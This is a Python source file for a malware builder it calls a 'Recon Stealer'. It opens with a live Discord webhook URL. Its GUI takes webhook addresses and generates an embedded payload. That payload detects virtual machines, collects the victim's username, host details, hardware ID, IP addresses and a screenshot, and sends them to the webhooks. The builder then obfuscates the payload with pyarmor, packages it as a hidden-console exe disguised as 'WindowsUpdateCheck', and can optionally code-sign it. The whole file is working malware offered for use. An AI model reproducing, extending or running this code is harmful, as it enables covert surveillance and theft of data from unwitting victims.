https://discord.com/api/webhooks/1420479039973490803/wAOLMbEAm-TVcAI61OSBb7YXzq-lzJzf4sPwde8XHjnuoQtiaMeN3Kwr29OI7AEqp4yO


import os
import sys
import subprocess
import tkinter as tk
from tkinter import messagebox, ttk
import re
import shutil
import tempfile
import textwrap
import requests
import uuid
import platform
import winreg

# =================== WEBHOOK TEST ===================
def test_webhook(hook):
    try:
        resp = requests.post(hook.strip(), json={"content": "Stealer recon test - webhook alive ðŸ”¥"}, timeout=10)
        if resp.status_code in (200, 204):
            return True, "Webhook working - test message sent."
        else:
            return False, f"Failed ({resp.status_code})"
    except Exception as e:
        return False, f"Error: {str(e)}"

# =================== GUI ===================
def get_webhook():
    root = tk.Tk()
    root.title("Recon Stealer Builder - Upgraded Silent Edition")
    root.geometry("700x400")
    root.resizable(False, False)

    tk.Label(root, text="Discord Webhook URLs (comma-separated for failover):", font=("Arial", 11)).pack(pady=15)
    webhook_entry = tk.Entry(root, width=90)
    webhook_entry.pack(pady=5)

    tk.Label(root, text="Code Signing PFX Path (optional, leave blank to skip):", font=("Arial", 9)).pack(pady=10)
    pfx_entry = tk.Entry(root, width=90)
    pfx_entry.pack(pady=5)

    tk.Label(root, text="PFX Password (if needed):", font=("Arial", 9)).pack(pady=5)
    pass_entry = tk.Entry(root, width=90, show="*")
    pass_entry.pack(pady=5)

    def run_test():
        hooks = [h.strip() for h in webhook_entry.get().split(",") if h.strip()]
        if not hooks:
            messagebox.showerror("Nope", "Enter at least one webhook.")
            return
        results = []
        for h in hooks:
            success, msg = test_webhook(h)
            results.append(f"{h[:30]}... -> {'OK' if success else 'FAIL'} ({msg})")
        messagebox.showinfo("Test Results", "\n".join(results))

    tk.Button(root, text="TEST WEBHOOKS", command=run_test, bg="#5865F2", fg="white", font=("Arial", 10, "bold")).pack(pady=10)

    progress = ttk.Progressbar(root, mode="indeterminate")

    def build():
        raw_hooks = webhook_entry.get().strip()
        if not raw_hooks or "discord.com/api/webhooks" not in raw_hooks.split(",")[0]:
            messagebox.showerror("Nope", "At least one valid Discord webhook required.")
            return
        webhooks = [h.strip() for h in raw_hooks.split(",") if h.strip()]
        pfx_path = pfx_entry.get().strip()
        pfx_pass = pass_entry.get().strip() or None

        progress.pack(pady=15)
        progress.start()
        root.update()

        try:
            generate_malware(webhooks, pfx_path, pfx_pass)
            progress.stop()
            progress.pack_forget()
            messagebox.showinfo("Built", "stealer.exe ready.\nFully silent, obfuscated, screenshot + recon exfil.\nMulti-webhook failover enabled.")
        except Exception as e:
            progress.stop()
            progress.pack_forget()
            messagebox.showerror("Error", str(e))
        root.destroy()

    tk.Button(root, text="BUILD EXE", command=build, bg="green", fg="white", font=("Arial", 14, "bold"), height=2).pack(pady=20)
    root.mainloop()

# =================== SILENT STEALER CODE ===================
stealer_code = textwrap.dedent('''
import os
import sys
import time
import subprocess
import socket
import requests
import ctypes
import platform
import uuid
import winreg
import random
from datetime import datetime

# Try to import pyautogui for screenshot (optional - fails silently if not there)
try:
    import pyautogui
    HAS_PYAUTO = True
except:
    HAS_PYAUTO = False

def is_vm():
    try:
        # Registry disk enum
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum")
        val = winreg.QueryValueEx(key, "0")[0].lower()
        if any(x in val for x in ["vmware", "vbox", "virtual", "qemu", "xen"]):
            return "Yes (Disk Enum)"
        winreg.CloseKey(key)
    except: pass

    try:
        if "VIRTUAL" in subprocess.check_output("systeminfo", shell=True, text=True).upper():
            return "Yes (SystemInfo)"
    except: pass

    try:
        if os.path.exists(r"C:\\windows\\System32\\drivers\\VBoxMouse.sys"):
            return "Yes (VBox Driver)"
    except: pass

    try:
        model = subprocess.check_output("wmic computersystem get model", text=True, shell=True).lower()
        if "vmware" in model or "virtual" in model:
            return "Yes (VMware/Virtual Model)"
    except: pass

    # Low RAM
    class MEM(ctypes.Structure):
        _fields_ = [("dwLength", ctypes.c_uint32), ("ullTotalPhys", ctypes.c_ulonglong)]
    mem = MEM(); mem.dwLength = ctypes.sizeof(mem)
    ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
    if mem.ullTotalPhys < 4 * 1024**3:
        return "Yes (Low RAM <4GB)"

    # CPUID check for hypervisor bit
    try:
        regs = ctypes.c_uint32 * 4
        out = regs()
        ctypes.windll.user32.CallNtPowerInformation(11, None, 0, out, ctypes.sizeof(out))  # rough hypervisor check
        if out[1] & 0x80000000:
            return "Yes (CPUID Hypervisor Bit)"
    except: pass

    # Common VM processes
    vm_procs = ["vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "xenservice.exe"]
    try:
        output = subprocess.check_output("tasklist", text=True)
        if any(p in output.lower() for p in vm_procs):
            return "Yes (VM Process)"
    except: pass

    return "No"

def get_public_ip():
    for url in ["https://api.ipify.org", "https://ifconfig.me", "https://icanhazip.com"]:
        try:
            return requests.get(url, timeout=5).text.strip()
        except:
            continue
    return "Failed"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "Failed"

def get_hwid():
    try:
        return subprocess.check_output("wmic csproduct get uuid", text=True).split("\\n")[1].strip()
    except:
        return str(uuid.getnode())

def exfil(webhooks):
    time.sleep(random.uniform(5, 15))  # randomized delay

    data = f"""
RECON REPORT - {datetime.utcnow().isoformat()} UTC
================================================
Username      : {os.getenv("USERNAME")}
Computer Name : {platform.node()}
OS            : {platform.system()} {platform.release()} ({platform.version()})
CPU           : {platform.processor()}
HWID          : {get_hwid()}
VM Detected   : {is_vm()}
Public IP     : {get_public_ip()}
Local IP      : {get_local_ip()}
"""

    files_to_send = {}
    temp_files = []

    # Write recon text
    recon_file = os.path.join(os.getenv("TEMP"), f"update_{random.randint(10000,99999)}.txt")
    with open(recon_file, "w", encoding="utf-8") as f:
        f.write(data)
    files_to_send["recon.txt"] = open(recon_file, "rb")
    temp_files.append(recon_file)

    # Screenshot if possible
    if HAS_PYAUTO:
        try:
            screen_path = os.path.join(os.getenv("TEMP"), f"screen_{random.randint(10000,99999)}.png")
            pyautogui.screenshot(screen_path)
            files_to_send["screenshot.png"] = open(screen_path, "rb")
            temp_files.append(screen_path)
        except:
            pass

    # Multi-webhook failover
    for hook in webhooks:
        try:
            payload = {"content": f"**New recon hit** - {os.getenv('USERNAME')}@{platform.node()}"}
            resp = requests.post(hook, data=payload, files=files_to_send, timeout=20)
            if resp.status_code in (200, 204):
                break  # success
        except:
            continue
    else:
        # All failed - fallback to plain text on first hook
        try:
            requests.post(webhooks[0], json={"content": f"Fallback recon (file send failed):\\n```\\n{data}\\n```"})
        except:
            pass

    # Cleanup
    for f in files_to_send.values():
        try: f.close()
        except: pass
    for p in temp_files:
        try: os.remove(p)
        except: pass

exfil({WEBHOOK_PLACEHOLDER})

# Optional persistence loop - uncomment if you want it to stay alive
# while True:
#     time.sleep(3600)
''')

# =================== BUILD ===================
def generate_malware(webhooks, pfx_path="", pfx_pass=None):
    if not shutil.which("pyarmor") and os.system("pyarmor --version") != 0:
        raise Exception("pyarmor not installed. Run: pip install pyarmor")

    temp_dir = tempfile.mkdtemp(prefix="build_", dir=os.getcwd())
    script = os.path.join(temp_dir, "recon.py")

    # Write with webhook list
    hook_str = repr(webhooks)
    with open(script, "w", encoding="utf-8") as f:
        f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", hook_str))

    # Obfuscate with pyarmor first
    obfuscate_cmd = ["pyarmor", "obfuscate", "--recursive", "--output", os.path.join(temp_dir, "obf"), script]
    result = subprocess.run(obfuscate_cmd, cwd=temp_dir, capture_output=True, text=True)
    if result.returncode != 0:
        raise Exception(f"Pyarmor failed:\n{result.stderr}")

    obf_script = os.path.join(temp_dir, "obf", "recon.py")

    # PyInstaller on obfuscated script
    cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--name", "WindowsUpdateCheck",
        "--clean",
        "--hidden-import=winreg",
        "--hidden-import=pyautogui",
        "--hidden-import=requests",
        obf_script
    ]

    result = subprocess.run(cmd, cwd=temp_dir, capture_output=True, text=True)
    if result.returncode != 0:
        raise Exception(f"PyInstaller failed:\n{result.stderr}")

    exe = os.path.join(temp_dir, "dist", "WindowsUpdateCheck.exe")
    final = os.path.join(os.getcwd(), "stealer.exe")
    shutil.copyfile(exe, final)

    # Optional signing
    if pfx_path and os.path.exists(pfx_path):
        sign_cmd = [
            "signtool", "sign",
            "/f", pfx_path,
            "/tr", "http://timestamp.digicert.com", "/td", "sha256"
        ]
        if pfx_pass:
            sign_cmd += ["/p", pfx_pass]
        sign_cmd += [final]

        sign_result = subprocess.run(sign_cmd, capture_output=True, text=True)
        if sign_result.returncode != 0:
            print(f"Signing failed (non-fatal):\n{sign_result.stderr}")
        else:
            print("EXE signed successfully.")

    shutil.rmtree(temp_dir, ignore_errors=True)
    print(f"Upgraded silent stealer built: {final}")

if __name__ == "__main__":
    get_webhook()

if __name__ == "__main__":
    get_webhook()
